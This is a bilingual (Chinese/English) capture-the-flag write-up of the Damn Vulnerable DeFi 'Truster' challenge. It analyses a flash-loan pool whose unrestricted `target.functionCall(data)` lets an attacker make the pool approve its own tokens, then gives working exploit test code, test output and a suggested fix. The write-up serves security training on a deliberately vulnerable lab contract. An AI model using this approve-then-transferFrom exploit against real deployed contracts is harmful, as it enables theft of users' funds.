# 🐑 Challenge #3 - Truster 信任者

![https://i.imgur.com/nrtLLrw.png](https://i.imgur.com/nrtLLrw.png)

> More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free. Currently the pool has 1 million DVT tokens in balance. And you have nothing. But don’t worry, you might be able to take them all from the pool. In a single transaction.
>
- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.2.0/contracts/truster)
- [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/truster/truster.challenge.js)
- 題目說有一個新上線的借貸池正在提供 DVT 的免手續費 [[FlashLoan]] 服務，它擁有 擁有一百萬 DVT。
- 目標是要將 一百萬 DVT佔為己有

## 思考切入點

- 閃電貸是免費的，所以可以利用
- 有辦法可以不還錢嗎？
- 哪裏可以轉錢出來給自己？

## 合約研讀：尋找攻擊點

### Study Contracts & Library Imported 研究引用合約與庫

- 先來研究一下，此合約索引用到的所有合約，可以看到總共有 import 三個檔案

```
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol"; //
import "@openzeppelin/contracts/security/ReentrancyGuard.sol"; // 找重入攻擊
```

1. [ERC20](https://docs.openzeppelin.com/contracts/3.x/erc20)
2. [Address Libraries](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address)：在 Address 加上一些方法，基本上多了很多種 call，看到 call 都要特別注意。 - `[isContract(account)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-isContract-address-)` - `[sendValue(recipient, amount)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-sendValue-address-payable-uint256-)` - `[functionCall(target, data)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCall-address-bytes-)` - `[functionCall(target, data, errorMessage)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCall-address-bytes-string-)` - `[functionCallWithValue(target, data, value)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCallWithValue-address-bytes-uint256-)` - `[functionCallWithValue(target, data, value, errorMessage)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCallWithValue-address-bytes-uint256-string-)` - `[functionStaticCall(target, data)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionStaticCall-address-bytes-)` - `[functionStaticCall(target, data, errorMessage)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionStaticCall-address-bytes-string-)` - `[functionDelegateCall(target, data)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionDelegateCall-address-bytes-)` - `[functionDelegateCall(target, data, errorMessage)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionDelegateCall-address-bytes-string-)`
3. [ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)：預防重入攻擊

### Study Function 研究函式弱點

可以操縱的變數？target、data 。可以操作的行為？target.functionCall(data)

```solidity
    function flashLoan(
        uint256 borrowAmount,  // ❌ 1. 要借的金額
        address borrower, // ❌ 2. 觸發借錢的人
        address target, // ✅ 3. 奇怪的 target，也不是收錢方，沒有限定任何合約
        bytes calldata data // ✅ 4. 任意 data
    ) external nonReentrant {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);

        // 😈？ functionCall 不就是 OpenZepplin Library 提供的方法嗎？ 所以基本上我們可以 call 任何合約做任何事
        // 所以可以呼叫 damnValuableToken approve 錢給 Attacker。這樣既不會更改到餘額，Attacker事後也可以把錢取走。
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));

        // 😈？ 可以讓人先更改餘額讓我們過嗎？ 看起來是不可能
        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
```

## 實現攻擊

Encode code data 有兩種作法可以 ecode，所以下面也列了兩種作法:

1. [etherJS](https://docs.ethers.io/v5/api/utils/abi/interface/): `interface.encodeFunctionData( fragment [ , values ] ) ⇒ string< DataHexString >` [Githubs-encodeFunctionData](https://github.com/ethers-io/ethers.js/blob/master/packages/abi/src.ts/interface.ts#L371)

```jsx
it('Exploit', async function () {
    const iface = new ethers.utils.Interface(["function approve(address sender, uint256 amount)"]);
    await this.pool.flashLoan(
        0,
        attacker.address,
        this.token.address,
        iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
    );
    await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
})
```

```
$ yarn run truster
  [Challenge] Truster
    ✓ Exploit (55ms)

  1 passing (930ms)

✨  Done in 3.67s.
```

1. [web3Js](https://web3js.readthedocs.io/en/v1.2.11/web3-eth-abi.html):`web3.eth.abi.encodeFunctionSignature(functionName)` 官方採用這種作法，但是要另外安裝 @openzeppelin/test-helpers

`npm i @openzeppelin/test-helpers`

```jsx
const { web3 } = require('@openzeppelin/test-helpers/src/setup');
it('Exploit', async function () {
    const data = web3.eth.abi.encodeFunctionCall({
        name: 'approve',
        type: 'function',
        inputs: [{
            type: 'address',
            name: 'spender'
        },{
            type: 'uint256',
            name: 'amount'
        }]
    }, [attacker.address, TOKENS_IN_POOL.toString()]);

    await this.pool.flashLoan(0, attacker.address, this.token.address, data)
    await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
});
```

```
$ yarn run truster
  [Challenge] Truster
    ✓ Exploit (62ms)

  1 passing (925ms)

✨  Done in 3.99s.
```

## 🔧 弱點總結 & 修改方式

這題我們運用了 [外部合約呼叫攻擊 Contracts interraction](https://www.notion.so/Contracts-interraction-5ef422648fa34f9d9015bfc5227ef987) ，來讓 pool 把 token 所有權轉讓給我們。所以看到外部呼叫一定要特別小心，因為 call 裡面真的什麼都有可能發生。如果這題要修改的話應該要限制 `target.functionCall(data)` 呼叫的合約不能是 token。

- 弱點:
    1. 對外部合約的呼叫沒有任何限制`target.functionCall(data)`
- 攻擊：1. 讓 pool 呼叫 token ，用 pool 的身份將 token approve 給自己
- 改進：
    1. 限定不能呼叫特定合約

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor(address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external nonReentrant {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
}

```

### 完整測試檔案

```jsx
const { ethers } = require('hardhat');
const { expect } = require('chai');
const { web3 } = require('@openzeppelin/test-helpers/src/setup');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });
    it('Exploit', async function () {
        const iface = new ethers.utils.Interface(["function approve(address sender, uint256 amount)"]);
        await this.pool.flashLoan(
            0,
            attacker.address,
            this.token.address,
            iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
        );
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
    })

    // it('Exploit', async function () {
    //     const data = web3.eth.abi.encodeFunctionCall({
    //         name: 'approve',
    //         type: 'function',
    //         inputs: [{
    //             type: 'address',
    //             name: 'spender'
    //         },{
    //             type: 'uint256',
    //             name: 'amount'
    //         }]
    //     }, [attacker.address, TOKENS_IN_POOL.toString()]);

    //     await this.pool.flashLoan(0, attacker.address, this.token.address, data)
    //     await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
    // });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

```

## References

- [ERC20](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20-approve-address-uint256-)
- [Solution](https://github.com/iphelix/damn-vulnerable-defi/blob/master/test/truster/truster.challenge.js)
- [Web3JS](https://web3js.readthedocs.io/en/v1.2.11/web3-eth-abi.html)
- <https://www.damnvulnerabledefi.xyz/challenges/3.html>
